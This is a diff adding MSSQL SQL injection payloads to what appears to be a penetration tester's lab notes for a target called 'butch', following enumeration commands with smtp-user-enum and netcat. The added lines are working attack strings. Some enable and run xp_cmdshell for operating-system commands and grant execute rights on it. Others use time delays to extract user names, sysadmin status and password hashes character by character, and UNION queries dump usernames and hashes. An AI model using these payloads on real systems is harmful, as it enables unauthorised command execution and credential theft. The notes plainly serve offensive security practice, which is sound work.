@@ -486,3 +486,33 @@ smtp-user-enum -M VRFY -u claire -t 192.168.55.55
 
 Connect to pop port to login to mail boxes:
 nc -v ipordomain 110
+
+Butch Blind sqli payloads:
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+
+butch';EXEC xp_cmdshell 'ping 192.168.49.179' ; --
+
+butch';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC xp_cmdshell 'ping -n 4 192.168.49.125';WAITFOR DELAY '0:0:5';--
+
+butch' UNION SELECT butch,butch --
+
+butch';IF (user_name()='butch') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--
+
+butch';IF (substring(user_name(), 2, 1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--
+
+butch';GRANT EXECUTE ON xp_cmdshell TO 'butch';--
+
+butch';IF (is_srvrolemember('sysadmin')=1) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--
+
+SELECT is_srvrolemember(‘sysadmin’);
+
+butch';IF (SUBSTRING((SELECT TOP 1 name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') AND name !='username'),1,1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--
+
+butch';IF (SUBSTRING((SELECT TOP 1 password_hash FROM users),1,1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--
+
+admin' UNION SELECT username,password_hash FROM users; --
